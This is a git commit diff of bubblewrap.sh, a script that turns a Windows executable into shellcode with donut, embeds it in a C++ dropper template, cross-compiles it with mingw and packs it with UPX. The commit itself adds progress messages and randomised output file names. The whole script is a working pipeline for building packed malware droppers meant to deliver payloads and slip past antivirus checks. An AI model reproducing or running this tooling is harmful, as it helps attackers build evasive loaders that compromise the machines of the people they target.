fd22a7001cf79578299417fd46fcf487bcc5b433
jimmio <git-jimmio.o3lma@dralias.com>
2021-11-28 21:11:52 -0500

    adds progress messages to bubblewrap.sh -- adds emacs temporary files to gitignore

--- bubblewrap.sh
+++ bubblewrap.sh
@@ -2,28 +2,41 @@
 
 # Everything here gets run inside the container
 
-if [ $# -eq 0 ]; then
-    echo "Usage: ./bubblewrap.sh <executable>"
-    exit 0
-fi
+# get an executable from /input (grabs the most recent)
+EXE=$(cd /root/bubblewrap/input && ls -t *.exe | head -n 1)
+
+# get a pseudorandom number to avoid file conflicts
+RAND_SUFFIX=$RANDOM
 
 # generate shellcode
-/opt/donut/donut -a 2 -f 3 /root/bubblewrap/$1
+echo
+echo "[*] Generating shellcode with donut"
+echo
+
+/opt/donut/donut -a 2 -f 3 -o /root/bubblewrap/output/shellcode_${RAND_SUFFIX}.txt /root/bubblewrap/input/${EXE}
 
 # extract the lines containing bytes
-tail -n +2 /root/bubblewrap/loader.rb | head -n -1 > loader-trimmed.rb
+tail -n +2 /root/bubblewrap/output/shellcode_${RAND_SUFFIX}.txt | head -n -1 > /root/bubblewrap/output/shellcode_trimmed_${RAND_SUFFIX}.txt
 
 # get the position of the byte array in the dropper template
-INSERT_PAYLOAD_AT_LINE=$(grep -n "unsigned char payload" dropper_base.cpp | cut -d \: -f 1)
+INSERT_PAYLOAD_AT_LINE=$(grep -n "unsigned char payload" /root/bubblewrap/dropper_base.cpp | cut -d \: -f 1)
 
 # get the length of the shellcode (assumes 16 bytes per line)
-let "NUM_BYTES = 16 * $(wc -l loader-trimmed.rb | cut -d ' ' -f 1)"
+let "NUM_BYTES = 16 * $(wc -l /root/bubblewrap/output/shellcode_trimmed_${RAND_SUFFIX}.txt | cut -d ' ' -f 1)"
 
 # insert the shellcode and its length into the dropper template
-sed -e "${INSERT_PAYLOAD_AT_LINE}r loader-trimmed.rb" -e "s/payload_len \= 0/payload_len \= ${NUM_BYTES}/g" /root/bubblewrap/dropper_base.cpp > /root/bubblewrap/dropper_mod.cpp
+sed -e "${INSERT_PAYLOAD_AT_LINE}r /root/bubblewrap/output/shellcode_trimmed_${RAND_SUFFIX}.txt" -e "s/payload_len \= 0/payload_len \= ${NUM_BYTES}/g" /root/bubblewrap/dropper_base.cpp > /root/bubblewrap/output/dropper_mod_${RAND_SUFFIX}.cpp
 
 # compile the dropper
-x86_64-w64-mingw32-c++ -o /root/bubblewrap/dropper.exe -static-libgcc -static-libstdc++ /root/bubblewrap/dropper_mod.cpp
+echo
+echo "[*] Compiling the dropper"
+echo
+
+x86_64-w64-mingw32-c++ -o /root/bubblewrap/output/dropper_${RAND_SUFFIX}.exe -static-libgcc -static-libstdc++ /root/bubblewrap/output/dropper_mod_${RAND_SUFFIX}.cpp
 
 # pack the dropper
-upx --ultra-brute /root/bubblewrap/dropper.exe -o /root/bubblewrap/dropper-packed.exe
+echo
+echo "[*] Packing the dropper"
+echo
+
+upx --ultra-brute /root/bubblewrap/output/dropper_${RAND_SUFFIX}.exe -o /root/bubblewrap/output/dropper_packed_${RAND_SUFFIX}.exe
